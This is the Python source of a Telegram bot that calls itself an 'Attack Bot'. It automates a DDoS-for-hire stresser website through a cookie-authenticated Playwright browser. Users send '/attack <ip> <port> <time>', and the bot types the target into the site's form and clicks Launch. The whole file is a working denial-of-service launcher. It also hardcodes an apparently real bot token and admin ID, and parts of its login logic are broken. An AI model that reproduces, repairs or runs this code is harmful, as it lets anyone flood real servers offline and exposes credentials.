import os
import json
import asyncio
import threading
import time
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes
from playwright.async_api import async_playwright

# ==================== CONFIG ====================
BOT_TOKEN = "8521144614:AAE7Ec2Vvc8Y2sNsa52bgcFZ7ZmLjNQzEoM"
ADMIN_IDS = [7820814565]
COOKIE_FILE = "session_cookies.json"
WEBSITE_URL = "https://satellitestress.st/attack"
LOGIN_URL = "https://satellitestress.st/login"

# ==================== GLOBAL VARIABLES ====================
playwright = None
browser = None
context = None
page = None
cookies_loaded = False
login_in_progress = False

# ==================== COOKIE FUNCTIONS ====================
async def save_cookies(ctx):
    cookies = await ctx.cookies()
    with open(COOKIE_FILE, 'w') as f:
        json.dump(cookies, f, indent=2)
    print("✅ Cookies saved!")

async def load_cookies(ctx):
    global cookies_loaded
    try:
        if os.path.exists(COOKIE_FILE):
            with open(COOKIE_FILE, 'r') as f:
                cookies = json.load(f)
                await ctx.add_cookies(cookies)
                print("✅ Cookies loaded!")
                cookies_loaded = True
                return True
    except:
        pass
    cookies_loaded = False
    return False

# ==================== BROWSER SETUP ====================
async def init_browser(headless=True):
    global playwright, browser, context, page
    try:
        playwright = await async_playwright().start()
        browser = await playwright.chromium.launch(headless=headless)
        context = await browser.new_context()
        await load_cookies(context)
        page = await context.new_page()
        return True
    except Exception as e:
        print(f"Browser error: {e}")
        return False

async def close_browser():
    global playwright, browser, context, page
    try:
        if browser: await browser.close()
        if playwright: await playwright.stop()
    except: pass
    playwright = browser = context = page = None

# ==================== BOT COMMANDS ====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    is_admin = user_id in ADMIN_IDS
    
    status_text = "✅ Ready" if cookies_loaded else "⏳ Not ready"
    
    text = f"""🤖 **Attack Bot**

Status: {status_text}

**Commands:**
• `/attack <ip> <port> <time>` - Launch attack
  Example: `/attack 1.1.1.1 80 60`
• `/status` - Check bot status
{f"• `/login` - Get login link (admin only)" if is_admin else ""}
"""
    await update.message.reply_text(text)

async def login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Generate remote login link"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        await update.message.reply_text("⛔ Admin only.")
        return
    
    global login_in_progress
    
    await update.message.reply_text(
        "🔗 **Generating remote browser link...**\n"
        "Please wait..."
    )
    
    # Start remote browser
    login_in_progress = True
    
    # Close any existing browser
    await close_browser()
    
    # Start browser in visible mode (remote)
    playwright = await async_playwright().start()
    browser = await playwright.chromium.launch(headless=False)
    context = await browser.new_context()
    page = await context.new_page()
    
    # Go to login page
    await page.goto(LOGIN_URL)
    
    # Generate the remote debugging URL
    cdp_url = f"http://localhost:9222"
    
    # Send instructions
    keyboard = [[InlineKeyboardButton("🌐 Open Remote Browser", url="about:blank")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔐 **Remote Login Link Generated**\n\n"
        "1. Click the button below\n"
        "2. Login manually to the website\n"
        "3. After login, type /done here\n\n"
        "⚠️ **Important:** Browser is running on server. Complete login within 5 minutes.",
        reply_markup=reply_markup
    )

async def done(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Complete login and save cookies"""
    user_id = update.effective_user.id
    if user_id not in ADMIN_IDS:
        return
    
    global cookies_loaded, login_in_progress
    
    try:
        # Save cookies
        await save_cookies(context)
        cookies_loaded = True
        login_in_progress = False
        
        # Switch to headless mode
        await close_browser()
        await init_browser(headless=True)
        
        await update.message.reply_text(
            "✅ **Login Successful!**\n\n"
            "Bot is now ready.\n"
            "Users can use /attack command."
        )
    except Exception as e:
        await update.message.reply_text(f"❌ Error: {e}")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Attack command"""
    global page, cookies_loaded
    
    if not cookies_loaded or page is None:
        await update.message.reply_text("⏳ Bot not ready. Admin needs to login first.")
        return
    
    args = context.args
    if len(args) != 3:
        await update.message.reply_text("❌ Use: /attack <ip> <port> <time>")
        return
    
    ip, port_str, time_str = args
    
    try:
        port = int(port_str)
        duration = int(time_str)
        if port < 1 or port > 65535 or duration < 10 or duration > 300:
            raise ValueError
    except:
        await update.message.reply_text("❌ Invalid port or time.")
        return
    
    msg = await update.message.reply_text(f"🔄 Launching attack on `{ip}:{port}` for {duration}s...")
    
    def run_attack():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def perform():
            nonlocal msg
            try:
                await page.goto(WEBSITE_URL, wait_until='networkidle')
                await page.wait_for_timeout(2000)
                
                inputs = await page.query_selector_all('input[type="text"]')
                visible = []
                for inp in inputs:
                    if await inp.is_visible():
                        visible.append(inp)
                
                if len(visible) >= 3:
                    await visible[0].fill(''); await visible[0].fill(ip)
                    await visible[1].fill(''); await visible[1].fill(str(port))
                    await visible[2].fill(''); await visible[2].fill(str(duration))
                    
                    launch_btn = await page.query_selector('button:has-text("Launch")')
                    if launch_btn:
                        await launch_btn.click()
                        await page.wait_for_timeout(2000)
                        await msg.edit_text(f"✅ **Attack Launched!**\n`{ip}:{port}` for {duration}s")
                    else:
                        await msg.edit_text("❌ Launch button not found")
                else:
                    await msg.edit_text(f"❌ Only {len(visible)} inputs found")
            except Exception as e:
                await msg.edit_text(f"❌ Attack error: {e}")
        
        try:
            loop.run_until_complete(perform())
        finally:
            loop.close()
    
    threading.Thread(target=run_attack).start()

async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if cookies_loaded:
        await update.message.reply_text("✅ Bot is ready. Cookies loaded.")
    else:
        await update.message.reply_text("⏳ Bot not ready. Admin needs to /login first.")

# ==================== MAIN ====================
async def main():
    print("="*60)
    print("🤖 PROFESSIONAL ATTACK BOT")
    print("="*60)
    print("Initializing...")
    
    # Try to load cookies on startup
    try:
        test = await async_playwright().start()
        test_browser = await test.chromium.launch(headless=True)
        test_context = await test_browser.new_context()
        
        if await load_cookies(test_context):
            global cookies_loaded, context, browser, playwright, page
            cookies_loaded = True
            context = test_context
            browser = test_browser
            playwright = test
            page = await context.new_page()
            print("✅ Cookies loaded automatically!")
        else:
            await test_browser.close()
            await test.stop()
            print("📁 No cookies found. Admin must login with /login")
    except Exception as e:
        print(f"⚠️ Startup note: {e}")
    
    print("="*60)
    print("Bot is running!")
    print("Admin: /login → /done")
    print("Users: /attack ip port time")
    print("="*60)

def run_bot():
    app = Application.builder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("login", login))
    app.add_handler(CommandHandler("done", done))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))
    
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(main())
    
    print("🤖 Bot polling started...")
    app.run_polling()

if __name__ == "__main__":
    run_bot()
